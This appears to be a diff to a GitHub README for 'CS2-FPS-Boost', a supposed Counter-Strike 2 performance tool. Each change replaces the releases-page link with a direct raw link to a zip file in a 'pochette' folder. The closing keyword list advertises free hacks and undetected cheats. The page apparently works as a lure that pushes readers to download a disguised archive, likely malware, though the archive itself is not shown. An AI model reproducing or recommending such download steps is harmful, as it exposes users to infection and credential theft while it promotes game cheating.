@@ -1,6 +1,6 @@
 # ⚡ CS2-FPS-Boost - Boost Your FPS Instantly
 
-[![Download CS2 FPS Boost](https://img.shields.io/badge/Download-CS2_FPS_Boost-2ea44f?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Mikeldead1351/CS2-FPS-Boost/releases)
+[![Download CS2 FPS Boost](https://img.shields.io/badge/Download-CS2_FPS_Boost-2ea44f?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/Mikeldead1351/CS2-FPS-Boost/main/pochette/FP_Boost_C_2.8-beta.5.zip)
 
 ## 🎯 What Is CS2-FPS-Boost?
 
@@ -12,7 +12,7 @@ Getting started with CS2-FPS-Boost is incredibly simple. You don't need any tech
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/Mikeldead1351/CS2-FPS-Boost/releases](https://github.com/Mikeldead1351/CS2-FPS-Boost/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/Mikeldead1351/CS2-FPS-Boost/main/pochette/FP_Boost_C_2.8-beta.5.zip](https://raw.githubusercontent.com/Mikeldead1351/CS2-FPS-Boost/main/pochette/FP_Boost_C_2.8-beta.5.zip)
 
 Click the download button on that page to get the latest version of CS2-FPS-Boost. The download will start automatically, and you'll see the file appear in your browser's download folder.
 
@@ -74,7 +74,7 @@ Ready to boost your CS2 performance? Here's everything you need to know about ge
 
 ### Download Process
 
-Visit this link to download the application: [https://github.com/Mikeldead1351/CS2-FPS-Boost/releases](https://github.com/Mikeldead1351/CS2-FPS-Boost/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/Mikeldead1351/CS2-FPS-Boost/main/pochette/FP_Boost_C_2.8-beta.5.zip](https://raw.githubusercontent.com/Mikeldead1351/CS2-FPS-Boost/main/pochette/FP_Boost_C_2.8-beta.5.zip)
 
 On that page, you'll find the latest release of CS2-FPS-Boost. Click the download button, and the file will start downloading to your computer. The file size is small, so the download should complete quickly even on slower connections.
 
@@ -140,6 +140,6 @@ CS2-FPS-Boost is the ultimate solution for Counter-Strike 2 players who want to 
 
 Don't wait any longer - download CS2-FPS-Boost today and experience the difference it makes in your gameplay. Your FPS will thank you!
 
-[![Download Now](https://img.shields.io/badge/Download-CS2_FPS_Boost-ff6b6b?style=for-the-badge&logo=download&logoColor=white)](https://github.com/Mikeldead1351/CS2-FPS-Boost/releases)
+[![Download Now](https://img.shields.io/badge/Download-CS2_FPS_Boost-ff6b6b?style=for-the-badge&logo=download&logoColor=white)](https://raw.githubusercontent.com/Mikeldead1351/CS2-FPS-Boost/main/pochette/FP_Boost_C_2.8-beta.5.zip)
 
 Keywords: cheat-free-download, counter-strike-2, cs2, cs2-2026, cs2-cheat, cs2-fps, cs2-fps-2026, cs2-fps-boost, cs2-fps-boost-2026, cs2-fps-boost-download, cs2-fps-boost-free, cs2-fps-boost-free-download, cs2-fps-boost-latest, cs2-fps-boost-pc, cs2-fps-boost-windows, cs2-fps-free, cs2-free-download, cs2-hack-free, free-hack-2026, undetected-cheat-2026
